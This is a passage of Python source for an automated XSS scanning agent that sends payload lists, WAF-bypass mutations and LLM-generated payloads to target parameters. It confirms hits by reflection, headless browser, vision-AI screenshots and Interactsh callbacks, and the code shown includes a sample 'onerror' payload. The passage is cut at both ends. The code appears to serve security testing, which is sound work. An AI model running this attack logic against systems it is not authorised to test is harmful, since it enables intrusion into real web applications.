        # Use TechContextMixin methods
        self._tech_stack_context = self.load_tech_stack(Path(scan_dir))
        self._xss_prime_directive = self.generate_xss_context_prompt(self._tech_stack_context)

        lang = self._tech_stack_context.get("lang", "generic")
        server = self._tech_stack_context.get("server", "generic")
        waf = self._tech_stack_context.get("waf")

        logger.info(f"[{self.name}] XSS tech context loaded: lang={lang}, server={server}, waf={waf or 'none'}")

    async def stop_queue_consumer(self) -> None:
        """Stop queue consumer mode gracefully."""
        try:
            if self._worker_pool:
                await self._worker_pool.stop()
                self._worker_pool = None

            self.event_bus.unsubscribe(
                EventType.WORK_QUEUED_XSS.value,
                self._on_work_queued
            )

            self._queue_mode = False
        finally:
            # Pipeline exit for the queue-driven path (the one the API actually runs).
            # In a finally because the caller gathers this with return_exceptions=True:
            # a failure in worker-pool shutdown would otherwise leak the whole scan's
            # documents for the lifetime of the process.
            freed = release_document_caches()
            logger.info(
                f"[{self.name}] Queue consumer stopped; released document caches: {freed}")

    async def _on_work_queued(self, data: dict) -> None:
        """Handle work_queued_xss notification (logging only)."""
        logger.debug(f"[{self.name}] Work queued: {data.get('finding', {}).get('url', 'unknown')}")

    async def _process_queue_item(self, item: dict) -> Optional[XSSFinding]:
        """
        Process a single item from the xss queue.

        Item structure (from ThinkingConsolidationAgent):
        {
            "finding": {
                "type": "XSS",
                "url": "...",
                "parameter": "...",
                "payload": "...",  # Optional suggested payload
                "context": "...",  # Reflection context
            },
            "priority": 85.5,
            "scan_context": "scan_123",
            "classified_at": 1234567890.0
        }
        """
        finding = item.get("finding", {})
        url = finding.get("url")
        param = finding.get("parameter")

        if not url or not param:
            logger.warning(f"[{self.name}] Invalid queue item: missing url or parameter")
            return None

        # Use existing XSS testing logic
        # Configure self for this specific test
        self.url = url
        self.params = [param]

        # Run validation (reuse existing _test_parameter or similar)
        result = await self._test_single_param_from_queue(url, param, finding)

        return result

    async def _test_single_param_from_queue(
        self, url: str, param: str, finding: dict, payload_type: str = None
    ) -> Optional[XSSFinding]:
        """
        Test a single parameter from queue for XSS.

        Uses existing validation pipeline but optimized for queue processing:
        1. Check reflection context from finding
        2. Select appropriate payloads for context (or payload_type if provided)
        3. Test with HTTP-first validation (Phase 15)
        4. Fall back to Playwright/CDP only if needed

        Args:
            url: Target URL
            param: Parameter to test
            finding: Finding data from queue
            payload_type: Optional payload type from LLM dedup (template, event_handler, etc.)

        Returns:
            XSSFinding if confirmed, None otherwise
        """
        try:
            # Get context from finding if available
            context = finding.get("context", "unknown")

            # v3.2: If payload_type is 'template' (AngularJS/Vue), override context
            if payload_type == "template":
                context = "template"
                logger.info(f"[{self.name}] Using template payloads for framework injection (Angular/Vue)")

            # v2.1.0: Load full payload from JSON if truncated in event
            suggested_payload = load_full_payload_from_json(finding)

            # Initialize Interactsh if not already done
            if not self.interactsh:
                try:
                    self.interactsh = InteractshClient()
                    await self.interactsh.register()
                except Exception as e:
                    logger.warning(f"[{self.name}] Interactsh init failed: {e}")

            interactsh_url = self.interactsh.get_url() if self.interactsh else ""

            # Build payload list - CURATED FIRST (agnostic, fast)
            # v3.2: Curated payloads FIRST (833 proven payloads, technology-agnostic)
            # This is faster than LLM context manipulation and covers most cases
            curated = self.payload_learner.get_prioritized_payloads([])[:20]
            curated = [p.replace("{{interactsh_url}}", interactsh_url) for p in curated]

            payloads = list(curated)  # Start with curated

            # Then suggested payload from finding (if not already in curated)
            if suggested_payload and suggested_payload not in payloads:
                payloads.insert(0, suggested_payload)  # Prioritize suggested

            # Add context-specific payloads as fallback
            context_payloads = self.get_payloads_for_context(context, interactsh_url)
            for p in context_payloads[:5]:
                if p not in payloads:
                    payloads.append(p)

            # Dedupe payloads (already mostly deduped, but ensure)
            seen = set()
            unique_payloads = []
            for p in payloads:
                if p not in seen:
                    seen.add(p)
                    unique_payloads.append(p)

            # v3.3: BOMBARDMENT-FIRST - fire all payloads via HTTP, browser only as fallback
            # Phase 1: HTTP bombardment - fast, no browser
            http_confirmed = []
            reflecting_payloads = []  # Payloads that reflect but HTTP couldn't confirm

            for payload in unique_payloads[:25]:
                result = await self._test_payload_http_only(url, param, payload, context)
                if result:
                    if result.validated:
                        http_confirmed.append(result)
                    else:
                        reflecting_payloads.append(result)

            # If ANY HTTP-confirmed → return best one (no browser needed)
            if http_confirmed:
                logger.info(f"[{self.name}] HTTP confirmed {len(http_confirmed)} XSS for {param}, skipping browser")
                return http_confirmed[0]

            # Check Interactsh for OOB confirmations (batch poll)
            if self.interactsh:
                try:
                    interactions = await self.interactsh.poll()
                    if interactions:
                        # Find the interactsh payload that triggered
                        for rp in reflecting_payloads:
                            if self._payload_carries_oob(rp.payload):
                                return XSSFinding(
                                    url=url, parameter=param, payload=rp.payload,
                                    context=context, validation_method="interactsh",
                                    evidence={"oob_callback": True, "interactions": interactions},
                                    confidence=1.0, status="VALIDATED_CONFIRMED", validated=True
                                )
                except Exception as e:
                    logger.debug(f"[{self.name}] Interactsh poll failed: {e}")

            # Phase 2: Browser fallback - only for reflecting payloads, max 3
            if reflecting_payloads:
                logger.info(f"[{self.name}] {len(reflecting_payloads)} payloads reflect for {param}, trying browser on top 3")
                for rp in reflecting_payloads[:3]:
                    try:
                        browser_result = await self._validate_via_browser(url, param, rp.payload)
                        if browser_result:
                            return XSSFinding(
                                url=url, parameter=param, payload=rp.payload,
                                context=context, validation_method="browser",
                                evidence=browser_result, confidence=0.95,
                                status="VALIDATED_CONFIRMED", validated=True
                            )
                    except Exception as e:
                        logger.debug(f"[{self.name}] Browser validation failed: {e}")

                # Phase 3: Visual fallback - only if browser also failed
                best_reflection = reflecting_payloads[0]
                reflection_context = self._analyze_reflection_context(
                    best_reflection.evidence.get("response_html", ""), best_reflection.payload
                )
                contexts_found = [reflection_context.get("context", "unknown")]
                visual_payloads = await self._ask_deepseek_visual_payloads(
                    param=param, contexts=contexts_found,
                    sample_payloads={contexts_found[0]: best_reflection.payload}
                )
                if visual_payloads:
                    logger.info(f"[{self.name}] Testing {len(visual_payloads)} visual payloads...")
                    screenshots_dir = self.report_dir / "captures"
                    screenshots_dir.mkdir(parents=True, exist_ok=True)
                    for i, vp in enumerate(visual_payloads[:5]):
                        dashboard.set_current_payload(vp[:50], "XSS Visual", f"[{i+1}/5]", self.name)
                        ev = await self._validate_visual_payload(param=param, payload=vp, screenshots_dir=screenshots_dir)
                        if ev and ev.get("vision_confirmed"):
                            return XSSFinding(
                                url=url, parameter=param, payload=vp, context=context,
                                validation_method="visual_vision_ai", evidence=ev,
                                confidence=0.98, status="VALIDATED_CONFIRMED", validated=True
                            )

            return None

        except Exception as e:
            logger.error(f"[{self.name}] Queue item test failed: {e}")
            return None

    async def _test_payload_http_only(
        self, url: str, param: str, payload: str, context: str
    ) -> Optional[XSSFinding]:
        """
        Test a single payload via HTTP only (no browser). Returns:
        - XSSFinding(validated=True) if HTTP confirms execution
        - XSSFinding(validated=False) if payload reflects but not confirmed (browser candidate)
        - None if no reflection at all
        """
        try:
            dashboard.set_current_payload(payload[:60], "XSS HTTP", "Testing", self.name)
            response_html = await self._send_payload(param, payload)
            if not response_html:
                return None

            # HTTP confirmation - validated=True
            evidence = {}
            if self._can_confirm_from_http_response(payload, response_html, evidence):
                return XSSFinding(
                    url=url, parameter=param, payload=payload, context=context,
                    validation_method="http_analysis",
                    evidence={"http_confirmed": True, "reflection": True},
                    confidence=0.85, status="VALIDATED_CONFIRMED", validated=True
                )

            # Payload reflects but not confirmed - browser candidate (validated=False)
            if self._payload_reflects(payload, response_html):
                return XSSFinding(
                    url=url, parameter=param, payload=payload, context=context,
                    validation_method="pending_browser",
                    evidence={"reflection": True, "response_html": response_html[:2000]},
                    confidence=0.4, status="PENDING_VALIDATION", validated=False
                )

            return None
        except Exception as e:
            logger.debug(f"[{self.name}] HTTP-only test failed: {e}")
            return None

    async def _test_with_manipulator(
        self, url: str, param: str, screenshots_dir: Path
    ) -> Optional[XSSFinding]:
        """
        v3.3: Use ManipulatorOrchestrator as the Python HTTP attack engine.

        This replaces the naive 25-payload loop with a full multi-phase campaign:
        - Phase 0: Context detection (where does probe reflect?)
        - Phase 1a: Static payload bombardment (PayloadAgent)
        - Phase 1b: LLM expansion × context-aware breakouts
        - Phase 2: WAF bypass encoding (Q-learning)
        - Phase 3: Blood smell analysis + agentic fallback

        If ManipulatorOrchestrator confirms via HTTP → return XSSFinding.
        If blood smell detected but not confirmed → browser validation fallback.
        """
        try:
            # Build MutableRequest from finding
            parsed = urllib.parse.urlparse(url)
            base_params = dict(urllib.parse.parse_qsl(parsed.query))
            # Ensure target param exists with a test value
            if param not in base_params:
                base_params[param] = "test"

            base_request = MutableRequest(
                method="GET",
                url=url.split("?")[0],  # Base URL without query string
                params=base_params
            )

            # Initialize ManipulatorOrchestrator with LLM and agentic fallback
            manipulator = ManipulatorOrchestrator(
                rate_limit=0.3,
                enable_agentic_fallback=True,
                enable_llm_expansion=True
            )

            dashboard.log(
                f"[{self.name}] ManipulatorOrchestrator: Starting HTTP campaign on '{param}'",
                "INFO"
            )

            # Run full campaign (Phases 0-3)
            success, mutation = await manipulator.process_finding(
                base_request,
                strategies=[MutationStrategy.PAYLOAD_INJECTION, MutationStrategy.BYPASS_WAF]
            )

            if success and mutation:
                # HTTP confirmed! Extract the working payload
                working_payload = mutation.params.get(param, str(mutation.params))
                logger.info(f"[{self.name}] ManipulatorOrchestrator CONFIRMED XSS: {param}={working_payload[:80]}")

                return XSSFinding(
                    url=url, parameter=param, payload=working_payload,
                    context="html", validation_method="manipulator_http",
                    evidence={"http_confirmed": True, "method": "ManipulatorOrchestrator"},
                    confidence=0.90, status="VALIDATED_CONFIRMED", validated=True
                )

            # ManipulatorOrchestrator failed - check blood smell for browser candidates
            if manipulator.blood_smell_history:
                blood_candidates = sorted(
                    manipulator.blood_smell_history,
                    key=lambda x: x["smell"]["severity"],
                    reverse=True
                )[:3]

                logger.info(
                    f"[{self.name}] ManipulatorOrchestrator: {len(blood_candidates)} blood smell "
                    f"candidates, trying browser validation"
                )

                for entry in blood_candidates:
                    blood_payload = entry["request"].params.get(param, "")
                    if not blood_payload:
                        continue
                    try:
                        browser_result = await self._validate_via_browser(url, param, blood_payload)
                        if browser_result:
                            return XSSFinding(
                                url=url, parameter=param, payload=blood_payload,
                                context="html", validation_method="manipulator_blood_browser",
                                evidence=browser_result, confidence=0.95,
                                status="VALIDATED_CONFIRMED", validated=True
                            )
                    except Exception as e:
                        logger.debug(f"[{self.name}] Blood browser validation failed: {e}")

            # Last resort: visual payloads (DeepSeek + Vision AI)
            logger.info(f"[{self.name}] ManipulatorOrchestrator exhausted, trying visual fallback")
            visual_payloads = await self._ask_deepseek_visual_payloads(
                param=param, contexts=["html"],
                sample_payloads={"html": f"<img src=x onerror=alert(1)>"}
            )
            if visual_payloads:
                for vp in visual_payloads[:5]:
                    dashboard.set_current_payload(vp[:50], "XSS Visual", "Testing", self.name)
                    ev = await self._validate_visual_payload(
                        param=param, payload=vp, screenshots_dir=screenshots_dir
                    )
                    if ev and ev.get("vision_confirmed"):
                        return XSSFinding(
                            url=url, parameter=param, payload=vp, context="html",
                            validation_method="visual_vision_ai", evidence=ev,
                            confidence=0.98, status="VALIDATED_CONFIRMED", validated=True
                        )

            await manipulator.shutdown()
            return None

        except Exception as e:
            logger.error(f"[{self.name}] ManipulatorOrchestrator campaign failed: {e}")
            # Fallback to simple queue test if manipulator crashes
            return await self._test_single_param_from_queue(url, param, {})

    async def _test_payload_from_queue(
        self, url: str, param: str, payload: str, context: str
    ) -> Optional[XSSFinding]:
        """
        Test a single payload against a parameter.

        Uses HTTP-first validation from Phase 15 for efficiency.

        Args:
            url: Target URL
            param: Parameter to test
            payload: XSS payload to test
            context: Reflection context

        Returns:
            XSSFinding if confirmed, None otherwise
        """
        try:
            # Update UI
            dashboard.set_current_payload(payload[:60], "XSS Queue", "Testing", self.name)

            # Send payload
            response_html = await self._send_payload(param, payload)

            if not response_html:
                return None

            # HTTP-first validation (Phase 15)
            evidence = {}
            if self._can_confirm_from_http_response(payload, response_html, evidence):
                return XSSFinding(
                    url=url,
                    parameter=param,
                    payload=payload,
                    context=context,
                    validation_method="http_analysis",
                    evidence={"http_confirmed": True, "reflection": self._payload_reflects(payload, response_html)},
                    confidence=0.85,
                    status="VALIDATED_CONFIRMED",
                    validated=True
                )

            # Check if browser validation needed - only if payload actually reflects
            if self._payload_reflects(payload, response_html) and self._requires_browser_validation(payload, response_html):
                # Attempt Playwright validation
                try:
                    browser_result = await self._validate_via_browser(url, param, payload)
                    if browser_result:
                        return XSSFinding(
                            url=url,
                            parameter=param,
                            payload=payload,
                            context=context,
                            validation_method="browser",
                            evidence=browser_result,
                            confidence=0.95,
                            status="VALIDATED_CONFIRMED",
                            validated=True
                        )
                except Exception as e:
                    logger.debug(f"[{self.name}] Browser validation failed: {e}")

            # Check Interactsh for OOB confirmation
            if self.interactsh and "interactsh" in payload.lower():
                await asyncio.sleep(2)  # Wait for callback
                try:
                    interactions = await self.interactsh.poll()
                    if interactions:
                        return XSSFinding(
                            url=url,
                            parameter=param,
                            payload=payload,
                            context=context,
                            validation_method="interactsh",
                            evidence={"oob_callback": True, "interactions": interactions},
                            confidence=1.0,
                            status="VALIDATED_CONFIRMED",
                            validated=True
                        )
                except Exception as e:
                    logger.debug(f"[{self.name}] Interactsh poll failed: {e}")

            # v3.2: Visual validation fallback - generate visual payloads and use Vision AI
            # This is the BULLETPROOF validation when HTTP/browser don't confirm
            if self._payload_reflects(payload, response_html):
                logger.info(f"[{self.name}] Payload reflects but not confirmed. Trying visual validation...")
                dashboard.log(f"[{self.name}] 🎨 Testing visual validation with Vision AI...", "INFO")

                # Get reflection context for visual payload generation
                reflection_context = self._analyze_reflection_context(response_html, payload)
                contexts_found = [reflection_context.get("context", "unknown")]

                # Generate visual payloads via DeepSeek
                visual_payloads = await self._ask_deepseek_visual_payloads(
                    param=param,
                    contexts=contexts_found,
                    sample_payloads={contexts_found[0]: payload}
                )

                if visual_payloads:
                    logger.info(f"[{self.name}] Testing {len(visual_payloads)} visual payloads...")
                    screenshots_dir = self.report_dir / "captures"
                    screenshots_dir.mkdir(parents=True, exist_ok=True)

                    for i, visual_payload in enumerate(visual_payloads[:5]):  # Max 5 visual payloads
                        dashboard.set_current_payload(
                            visual_payload[:50], "XSS Visual", f"Testing [{i+1}/5]", self.name
                        )

                        evidence = await self._validate_visual_payload(
                            param=param,
                            payload=visual_payload,
                            screenshots_dir=screenshots_dir
                        )

                        if evidence and evidence.get("vision_confirmed"):
                            logger.info(f"[{self.name}] ✅ Vision AI confirmed XSS!")
                            dashboard.log(f"[{self.name}] ✅ Vision AI CONFIRMED visual XSS!", "SUCCESS")
                            return XSSFinding(
                                url=url,
                                parameter=param,
                                payload=visual_payload,
                                context=context,
                                validation_method="visual_vision_ai",
                                evidence=evidence,
                                confidence=0.98,
                                status="VALIDATED_CONFIRMED",
                                validated=True
                            )

            # v3.2: CANDIDATE fallback - if payload reflects but couldn't be confirmed
            # This prevents losing findings that automated tools can't validate
            # but a human pentester should review
            if self._payload_reflects(payload, response_html):
                # Check if it's in a potentially dangerous context
                dangerous_contexts = [
                    '<script', 'javascript:', 'on', '{{', '${',
                    'href=', 'src=', 'action='
                ]
                in_dangerous_context = any(
                    ctx in response_html.lower() and payload.lower() in response_html.lower()
                    for ctx in dangerous_contexts
                )

                if in_dangerous_context:
                    logger.info(
                        f"[{self.name}] Payload reflects in potentially dangerous context "
                        f"but couldn't be auto-confirmed. Marking as CANDIDATE."
                    )
                    return XSSFinding(
                        url=url,
                        parameter=param,
                        payload=payload,
                        context=context,
                        validation_method="reflection_analysis",
                        evidence={
                            "reflected": True,
                            "auto_confirmed": False,
                            "reason": "Payload reflects in dangerous context but execution not confirmed"
                        },
                        confidence=0.6,
                        status="CANDIDATE",
                        validated=False
                    )

            return None

        except Exception as e:
            logger.debug(f"[{self.name}] Payload test failed: {e}")
            return None

    async def _validate_via_browser(
        self, url: str, param: str, payload: str, screenshot_dir: str = None
    ) -> Optional[Dict[str, Any]]:
        """
        Validate XSS using browser with intelligent escalation.

        Flow: Playwright (L3) → CDP (L4) → DOM XSS detector

        Args:
            url: Target URL
            param: Parameter name
            payload: XSS payload
            screenshot_dir: Directory to save evidence screenshots

        Returns:
            Evidence dict if confirmed, None otherwise
        """
        try:
            # Build test URL with payload
            from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
            parsed = urlparse(url)
            query_params = parse_qs(parsed.query, keep_blank_values=True)
            query_params[param] = [payload]
            new_query = urlencode(query_params, doseq=True)
            test_url = urlunparse(parsed._replace(query=new_query))

            # v3.2.1: CDP disabled - Playwright only (L3)
            result = await self.verifier.verify_xss(
                url=test_url,
                screenshot_dir=screenshot_dir,
                timeout=15.0,
                max_level=3  # L3=Playwright only, no CDP
            )

            if result and result.success:
                ss_path = getattr(result, 'screenshot_path', None)
                return {
                    "confirmed": True,
                    "method": result.method,
                    "evidence": getattr(result, 'evidence', {}),
                    "screenshot": ss_path,
                    "screenshot_path": ss_path,
                }

            # NOTE: DOM XSS detection removed from payload validation
            # detect_dom_xss finds DOM XSS that exist INDEPENDENTLY of the payload
            # we're testing. Mixing them causes FALSE POSITIVES where we report
            # a payload as working when actually a different DOM XSS exists.
            #
            # DOM XSS scanning should be done separately in _run_dom_xss_scan()
            # which creates its own findings with the correct payload.

            return None

        except Exception as e:
            logger.debug(f"[{self.name}] Browser validation error: {e}")
            return None

    def _detect_xss_root_cause(self, url: str, parameter: str, context: str,
                               sink: str = None, source: str = None) -> Optional[str]:
        """
        Detect if XSS is caused by a global vulnerability affecting multiple pages.

        Some DOM XSS vulnerabilities originate from shared JavaScript files that
        are loaded on every page (e.g., scanme.js with a postMessage->eval handler).
        These should be reported as ONE finding with affected_urls, not N separate findings.

        Returns:
            Root cause identifier string if global, None if URL-specific.
        """
        # Pattern 1: postMessage -> eval (global event handler in shared JS)
        if parameter == "postMessage" or source == "postMessage" or parameter == "window.postMessage" or source == "window.postMessage":
            sink_name = str(sink).lower() if sink else "unknown"
            if "eval" in sink_name:
                return "postMessage_eval_global"
            return f"postMessage_{sink_name}_global"

        # Pattern 2: location.search -> document.write (global searchLogger)
        if parameter == "location.search" and context == "dom_xss":
            if sink and "document.write" in str(sink).lower():
                return "location_search_docwrite_global"

        # Not a global vulnerability — use per-URL fingerprint
        return None

    def _generate_xss_fingerprint(self, url: str, parameter: str, context: str,
                                  sink: str = None, source: str = None) -> tuple:
        """
        Generate XSS finding fingerprint for expert deduplication.

        XSS is URL-specific and parameter-specific, but the SAME XSS
        in the SAME parameter with different payloads = DUPLICATE.

        For global DOM XSS (e.g., postMessage->eval from shared JS), returns
        a root-cause fingerprint that groups findings across different URLs.

        Args:
            url: Target URL
            parameter: Parameter name
            context: Reflection context (e.g., "html_attribute", "script_tag")
            sink: DOM sink (e.g., "eval", "innerHTML") - optional, for root cause detection
            source: DOM source (e.g., "postMessage", "location.hash") - optional

        Returns:
            Tuple fingerprint for deduplication
        """
        from urllib.parse import urlparse

        # Check for global root cause (DOM XSS affecting multiple pages)
        root_cause = self._detect_xss_root_cause(url, parameter, context, sink=sink, source=source)
        if root_cause:
            parsed = urlparse(url)
            return ("XSS_GLOBAL", parsed.netloc, root_cause, context)

        parsed = urlparse(url)
        normalized_path = parsed.path.rstrip('/')

        # XSS signature: (host, path, parameter, context)
        # Different contexts in same parameter = distinct vulnerabilities
        # Example: XSS in <script> vs XSS in attribute = different
        fingerprint = ("XSS", parsed.netloc, normalized_path, parameter.lower(), context)

        return fingerprint

    async def _handle_queue_result(self, item: dict, result: Optional[XSSFinding]) -> None:
        """
        Handle completed queue item processing.

        Emits vulnerability_detected event on confirmed findings.
        v3.2: Respects the status already set by _test_payload_from_queue
        (VALIDATED_CONFIRMED, CANDIDATE) instead of re-calculating.
        """
        if result is None:
            return

        # Add to findings list
        self.findings.append(result)

        # v3.2.1: XSSAgent validates everything, no CDP escalation
        validation_status = result.status
        # CDP disabled - all findings go direct to reporting
        needs_cdp = False

        # EXPERT DEDUPLICATION: Check if we already emitted this finding
        # Pass sink/source from evidence for global root cause detection
        _sink = result.evidence.get("sink") if result.evidence else None
        _source = result.evidence.get("source") if result.evidence else None
        fingerprint = self._generate_xss_fingerprint(
            result.url, result.parameter, result.context,
            sink=_sink, source=_source
        )

        # For global XSS (e.g., postMessage->eval from shared JS), group by root cause
        # and track affected URLs — only emit ONE finding per root cause
        if fingerprint[0] == "XSS_GLOBAL":
            if fingerprint in self._global_xss_findings:
                # Already emitted this root cause — just add URL to affected list
                if result.url not in self._global_xss_findings[fingerprint]:
                    self._global_xss_findings[fingerprint].append(result.url)
                logger.info(f"[{self.name}] Global XSS dedup: added {result.url} to root cause {fingerprint[2]} "
                           f"(now {len(self._global_xss_findings[fingerprint])} affected URLs)")
                return  # Don't emit duplicate
            else:
                # First occurrence — track and continue to emit
                self._global_xss_findings[fingerprint] = [result.url]
                logger.info(f"[{self.name}] Global XSS detected: root cause {fingerprint[2]} on {result.url}")

        if fingerprint in self._emitted_findings:
            logger.info(f"[{self.name}] Skipping duplicate XSS finding: {result.url}?{result.parameter} in {result.context} (already reported)")
            return

        # Mark as emitted
        self._emitted_findings.add(fingerprint)

        # Use validated emit helper (Phase 1 Refactor)
        finding_dict = {
            "type": "XSS",
            "url": result.url,
            "parameter": result.parameter,
            "payload": result.payload,
            "context": result.context,
            "confidence": result.confidence,
            "validation_method": result.validation_method,
            "evidence": {"validated": True}  # Minimal evidence for validation
        }

        # For global XSS, include affected_urls in evidence
        if fingerprint[0] == "XSS_GLOBAL":
            finding_dict["evidence"]["root_cause"] = fingerprint[2]
            finding_dict["evidence"]["affected_urls"] = self._global_xss_findings[fingerprint]

        emitted = self._emit_xss_finding(
            finding_dict,
            status=validation_status if isinstance(validation_status, str) else validation_status.value,
            needs_cdp=needs_cdp
        )

        if emitted:
            logger.info(f"[{self.name}] Confirmed XSS: {result.url}?{result.parameter}")
        else:
            logger.warning(f"[{self.name}] ⚠️  Confirmed XSS NOT emitted (rejected by _validate_before_emit): {result.url}?{result.parameter}")

    def get_queue_stats(self) -> dict:
        """Get queue consumer statistics."""
        if not self._worker_pool:
            return {"mode": "direct", "queue_mode": False}

        return {
            "mode": "queue",
            "queue_mode": True,
            "worker_stats": self._worker_pool.get_stats(),
            "findings_confirmed": len(self.findings),
        }

    async def run_loop(self) -> Dict:
        """Main entry point for XSS scanning."""
        dashboard.current_agent = self.name
        dashboard.log(f"[{self.name}] 🚀 Starting LLM-driven XSS analysis on {self.url}", "INFO")

        # Use captures/ directly - no need for intermediate screenshots/ folder
        screenshots_dir = self.report_dir / "captures"
        screenshots_dir.mkdir(parents=True, exist_ok=True)

        try:
            # Phase 0-1: WAF detection and Interactsh setup
            interactsh_domain = await self._loop_setup_waf_and_interactsh()

            # Phase 2: Discover parameters
            if not await self._loop_discover_params():
                return {"findings": [], "message": "No parameters found"}

            # Phase 3: Test parameters
            await self._loop_test_params(interactsh_domain, screenshots_dir)

            # Phase 3.5: DOM XSS with visual validation
            await self._loop_test_dom_xss(screenshots_dir)

            # Phase 4: Additional vectors
            await self._loop_test_additional_vectors(interactsh_domain, screenshots_dir)

            # Phase 5: Cleanup
            if self.interactsh:
                await self.interactsh.deregister()

            # Return results
            validated_count = len(self.findings)
            logger.info(f"[{self.name}] Returning {validated_count} findings.")
            dashboard.log(f"[{self.name}] ✅ Scan complete. {validated_count} XSS found.", "SUCCESS")

            # v3.2: Base64 encode payloads to prevent JSON escaping issues
            from bugtrace.core.payload_format import encode_finding_payloads
            findings_dicts = [self._finding_to_dict(f) for f in self.findings]
            encoded_findings = [encode_finding_payloads(fd) for fd in findings_dicts]

            return {
                "findings": encoded_findings,
                "validated_count": validated_count,
                "params_tested": len(self.params)
            }

        except Exception as e:
            logger.exception(f"XSSAgent error: {e}")
            dashboard.log(f"[{self.name}] ❌ Error: {e}", "ERROR")
            return {"findings": [], "error": str(e)}

        finally:
            # Pipeline exit: the response bodies memoized by the confirmation predicates
            # are dead weight from here on, and this process outlives the scan.
            freed = release_document_caches()
            logger.debug(
                f"[{self.name}] Released document caches at run_loop exit: {freed}")


    async def _probe_and_analyze_context(
        self, param: str
    ) -> Tuple[Optional[str], Optional[str], int, Dict, str, str, Dict]:
        """Phase 1: Probe parameter and analyze context."""
        # Probe to get HTML with reflection and analyze context
        html, probe_url, status_code = await self._probe_parameter(param)

        # Use framework's WAF detection
        waf_detected = self._detected_waf is not None
        if html == "":
            dashboard.log(f"[{self.name}] 🛡️ WAF Detected (Probe Blocked). Switching to Direct Fire Strategy.", "WARN")
            waf_detected = True
            html = "<html><body>WAF_BLOCKED_PROBE</body></html>"

        if html is None:
            return None, None, 0, {}, "", "", {}

        # Analyze context
        global_context = self._analyze_global_context(html)
        dashboard.log(f"[{self.name}] 🌍 Global Context: {global_context}", "INFO")

        context_data = self._analyze_reflection_context(html, self.PROBE_STRING)
        context_data["global_context"] = global_context

        # Determine reflection type
        if not context_data.get("reflected"):
            if context_data.get("is_blocked"):
                reflection_type = "waf_blocked"
                surviving_chars = "unknown"
            else:
                reflection_type = "unknown (potential DOM XSS)"
                surviving_chars = "unknown"
        else:
            reflection_type = context_data.get("context", "unknown")
            surviving_chars = context_data.get("surviving_chars", "")

        # Get injection context for reporting
        injection_ctx = self.detect_injection_context(html, self.PROBE_STRING)
        server_escaping = await self.analyze_server_escaping(self.url, param)

        return html, probe_url, status_code, context_data, reflection_type, surviving_chars, injection_ctx

    async def _smart_get_llm_payloads(
        self,
        html: str,
        param: str,
        interactsh_url: str,
        context_data: Dict
    ) -> Optional[List[Dict]]:
        """Get LLM-generated smart payloads based on DOM analysis."""
        dashboard.log(f"[{self.name}] 🧠 LLM Brain: Analyzing DOM structure...", "INFO")

        smart_payloads = await self._llm_smart_dom_analysis(
            html=html,
            param=param,
            probe_string=self.PROBE_STRING,
            interactsh_url=interactsh_url,
            context_data=context_data
        )

        if smart_payloads:
            dashboard.log(f"[{self.name}] 🎯 Testing {len(smart_payloads)} LLM-generated precision payloads", "INFO")

        return smart_payloads

    def _smart_build_finding_from_payload(
        self,
        param: str,
        sp: Dict,
        payload: str,
        evidence: Dict,
        reflection_type: str,
        surviving_chars: str,
        injection_ctx: Any
    ) -> XSSFinding:
        """Build XSS finding from validated smart payload."""
        return self._create_xss_finding(
            param, payload, sp.get("reasoning", "LLM Smart Analysis"),
            "llm_smart_analysis", evidence, sp.get("confidence", 0.9),
            reflection_type, surviving_chars, [payload],
            injection_ctx, "context_aware_payload",
            sp.get("reasoning", "LLM generated specific payload for this context.")
        )

    async def _smart_validate_and_build_finding(
        self,
        param: str,
        sp: Dict,
        payload: str,
        screenshots_dir: Path,
        reflection_type: str,
        surviving_chars: str,
        injection_ctx: Any
    ) -> Optional[XSSFinding]:
        """Validate smart payload and build finding if successful."""
        response_html = await self._send_payload(param, payload)
        if not response_html:
            return None

        validated, evidence = await self._validate(
            param, payload, response_html, screenshots_dir
        )
        if not validated:
            return None

        finding_data = {
            "evidence": evidence,
            "screenshot_path": evidence.get("screenshot_path"),
            "context": sp.get("reasoning", "LLM Smart Analysis"),
            "reflection_context": reflection_type
        }

        if not self._should_create_finding(finding_data):
            return None

        return self._smart_build_finding_from_payload(
            param, sp, payload, evidence, reflection_type,
            surviving_chars, injection_ctx
        )

    async def _test_smart_llm_payloads(
        self,
        param: str,
        html: str,
        context_data: Dict,
        interactsh_url: str,
        screenshots_dir: Path,
        reflection_type: str,
        surviving_chars: str,
        injection_ctx: Any
    ) -> Optional[XSSFinding]:
        """Phase 2: Test LLM-generated smart payloads."""
        if not context_data.get("reflected", False):
            return None

        smart_payloads = await self._smart_get_llm_payloads(
            html, param, interactsh_url, context_data
        )
        if not smart_payloads:
            return None

        for sp in smart_payloads:
            if self._max_impact_achieved:
                break

            payload = sp["payload"]
            dashboard.set_current_payload(payload[:60], "XSS Smart", "Testing")

            finding = await self._smart_validate_and_build_finding(
                param, sp, payload, screenshots_dir, reflection_type,
                surviving_chars, injection_ctx
            )
            if finding:
                return finding

        return None

    def _hybrid_build_probe_result(
        self,
        context_data: Dict,
        surviving_chars: str,
        reflection_type: str,
        status_code: int
    ):
        """Build ProbeResult for adaptive batching."""
        from bugtrace.agents.payload_batches import ProbeResult

        waf_detected = self._detected_waf is not None or context_data.get("is_blocked", False)
        return ProbeResult(
            reflected=context_data.get("reflected", False),
            surviving_chars=surviving_chars,
            waf_detected=waf_detected,
            waf_name=self._detected_waf,
            context=reflection_type,
            status_code=status_code
        )

    def _hybrid_get_adaptive_payloads(
        self,
        probe_result,
        reflection_type: str,
        raw_payloads: List[str]
    ) -> List[str]:
        """Get adaptive payloads using batcher escalation."""
        from bugtrace.agents.payload_batches import payload_batcher

        current_batch = "universal"
        tested_batches = set()
        hybrid_payloads = []

        while current_batch and current_batch not in tested_batches and len(hybrid_payloads) < 100:
            tested_batches.add(current_batch)

            new_payloads = payload_batcher.get_batch(current_batch)
            filtered_batch = self._filter_payloads_by_context(new_payloads, reflection_type)
            hybrid_payloads.extend(filtered_batch)

            current_batch = payload_batcher.decide_escalation(probe_result, tested_batches)

        if not hybrid_payloads:
            hybrid_payloads = self._filter_payloads_by_context(raw_payloads, reflection_type)[:50]

        return hybrid_payloads

    async def _test_hybrid_payloads(
        self,
        param: str,
        interactsh_url: str,
        screenshots_dir: Path,
        reflection_type: str,
        surviving_chars: str,
        context_data: Dict,
        status_code: int,
        injection_ctx: Any
    ) -> Optional[XSSFinding]:
        """Phase 3: Test hybrid payloads (Learned + Curated + Golden)."""
        raw_payloads = self.payload_learner.get_prioritized_payloads(self.GOLDEN_PAYLOADS)

        probe_result = self._hybrid_build_probe_result(
